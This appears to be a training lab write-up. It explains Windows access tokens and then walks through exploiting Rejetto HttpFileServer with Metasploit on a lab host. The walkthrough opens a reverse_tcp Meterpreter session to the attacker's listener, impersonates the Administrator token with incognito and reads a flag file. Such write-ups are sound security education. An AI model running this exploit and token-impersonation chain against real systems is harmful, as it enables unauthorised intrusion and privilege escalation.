Windows Access Tokens
- Windows access tokens are a core element of the authentication process on Windows and are created and managed by the Local security authority subsystem service (lsass)
- A windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put, an access tooken can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed.
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identity and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from the parent and will run under the privileges of the same access token.
- Windows Access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token.
- An access token will typically be assigned one of the following security levels:
	- Impersonate level tokens are created as a direct result of a non interactive login on windows, typically through specific system services or domain logons
	- Delegate level tokens are typically created through an interactive login in windows, primarily through a traditional login or through remote access protocols such as RDP.
- Impersonate level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token
- Delegate level tokens pose the largest threat as they can be used to impersonate tokens on any system.
- The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available.
- The following are the privileges that are required for a successful impersonation attack:
	- SeAssignPrimaryToken: This allows a user to impersonate tokens
	- SeCreateToken: This allows a user to create an arbitrary token with administrative privileges
	- SeImpersonatePrivileges: This allows a user to create a process under the security context of another user tyically with administrative privileges.
- Incognito is a built in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
- We can use incognito module to display a list of available tokens that we can impersonate.

---

[[ping]]

```
root@attackdefense:~# cat /root/Desktop/target 
Target IP Address : 10.5.24.118
root@attackdefense:~# ping -c 5 10.5.24.118
PING 10.5.24.118 (10.5.24.118) 56(84) bytes of data.
64 bytes from 10.5.24.118: icmp_seq=1 ttl=125 time=3.25 ms
64 bytes from 10.5.24.118: icmp_seq=2 ttl=125 time=2.37 ms
64 bytes from 10.5.24.118: icmp_seq=3 ttl=125 time=2.34 ms
64 bytes from 10.5.24.118: icmp_seq=4 ttl=125 time=2.51 ms
64 bytes from 10.5.24.118: icmp_seq=5 ttl=125 time=2.33 ms

--- 10.5.24.118 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4006ms
rtt min/avg/max/mdev = 2.329/2.560/3.253/0.352 ms
```

[[Hack2.0/NMAP|NMAP]]

```
root@attackdefense:~# nmap 10.5.24.118
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 14:43 IST
Nmap scan report for 10.5.24.118
Host is up (0.0022s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds
root@attackdefense:~# nmap -sV 10.5.24.118
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-18 14:43 IST
Nmap scan report for 10.5.24.118
Host is up (0.0025s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          HttpFileServer httpd 2.3
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.08 seconds
```

We can see that the port 80 is running file sharing service we will use it to exploit.

```
root@attackdefense:~# service postgresql start && msfconsole
Starting PostgreSQL 13 database server: main.
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.1.0-dev                           ]
+ -- --=[ 2160 exploits - 1146 auxiliary - 367 post       ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: You can pivot connections over sessions 
started with the ssh_login modules

msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > show options

Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.12.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.5.24.118
rhosts => 10.5.24.118
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/q8meS6jI
[*] Local IP: http://10.10.12.2:8080/q8meS6jI
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /q8meS6jI
[*] Sending stage (175174 bytes) to 10.5.24.118
[!] Tried to delete %TEMP%\BoxpFqDmrIuFj.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.12.2:4444 -> 10.5.24.118:49742) at 2023-07-18 14:47:57 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter > pgrep explorer
3996
meterpreter > migrate 3996
[*] Migrating from 3220 to 3996...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > getuid
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeSystemtimePrivilege
SeTimeZonePrivilege

meterpreter > load incognito 
Loading extension incognito...
[*] 10.5.24.118 - Meterpreter session 1 closed.  Reason: Died
^C[-] Error running command load: Interrupt 
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.12.2:4444 
[*] Using URL: http://0.0.0.0:8080/UasxHDEzV
[*] Local IP: http://10.10.12.2:8080/UasxHDEzV
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /UasxHDEzV
[*] Sending stage (175174 bytes) to 10.5.24.118
[!] Tried to delete %TEMP%\SHNbrYROSG.vbs, unknown result
[*] Meterpreter session 2 opened (10.10.12.2:4444 -> 10.5.24.118:49757) at 2023-07-18 14:50:00 +0530
[*] Server stopped.

meterpreter > load incognito 
Loading extension incognito...Success.
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available

meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > getprivs
[-] stdapi_sys_config_getprivs: Operation failed: Access is denied.
meterpreter > pgrep explorer
3996
meterpreter > migrate 3996
[*] Migrating from 5108 to 3996...
[*] Migration completed successfully.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege

meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\SYSTEM
Window Manager\DWM-1

Impersonation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\NETWORK SERVICE

meterpreter > shell
Process 1260 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.
C:\Windows\system32>cd C:\\
cd C:\\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
07/18/2023  09:17 AM    <DIR>          http-server
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/07/2020  07:47 AM    <DIR>          Program Files
11/07/2020  07:47 AM    <DIR>          Program Files (x86)
11/07/2020  08:15 AM    <DIR>          Users
07/18/2023  09:10 AM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  16,053,456,896 bytes free

C:\>cd Users	
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users

11/07/2020  08:15 AM    <DIR>          .
11/07/2020  08:15 AM    <DIR>          ..
11/07/2020  07:22 AM    <DIR>          Administrator
12/12/2018  07:45 AM    <DIR>          Public
11/07/2020  08:15 AM    <DIR>          student
               0 File(s)              0 bytes
               5 Dir(s)  16,053,456,896 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\Users\Administrator

11/07/2020  07:22 AM    <DIR>          .
11/07/2020  07:22 AM    <DIR>          ..
11/07/2020  07:22 AM    <DIR>          3D Objects
11/07/2020  07:22 AM    <DIR>          Contacts
04/22/2021  06:37 AM    <DIR>          Desktop
11/07/2020  08:15 AM    <DIR>          Documents
11/07/2020  07:22 AM    <DIR>          Downloads
11/07/2020  07:22 AM    <DIR>          Favorites
11/07/2020  07:22 AM    <DIR>          Links
11/07/2020  07:22 AM    <DIR>          Music
11/07/2020  07:22 AM    <DIR>          Pictures
11/07/2020  07:22 AM    <DIR>          Saved Games
11/07/2020  07:22 AM    <DIR>          Searches
11/07/2020  07:22 AM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  16,053,456,896 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
x28c832a39730b7d46d6c38f1ea18e12
C:\Users\Administrator\Desktop>

```

